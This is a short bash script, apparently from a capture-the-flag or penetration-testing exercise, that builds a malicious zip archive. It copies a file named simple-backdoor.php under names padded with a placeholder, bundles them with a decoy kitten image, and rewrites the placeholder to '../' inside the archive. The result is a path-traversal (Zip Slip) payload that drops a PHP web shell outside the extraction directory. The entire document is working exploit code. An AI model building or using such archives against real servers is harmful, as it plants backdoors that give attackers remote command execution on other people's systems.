#!/bin/bash

rm cmd.zip

for i in `seq 1 10`
do 
    FILE=$FILE"xxA"
    cp simple-backdoor.php $FILE"cmd.php"
done

zip cmd.zip xx*.php kitten-cuteness300.jpg

sed -i 's/xxA/..\//g' cmd.zip

rm xx*.php
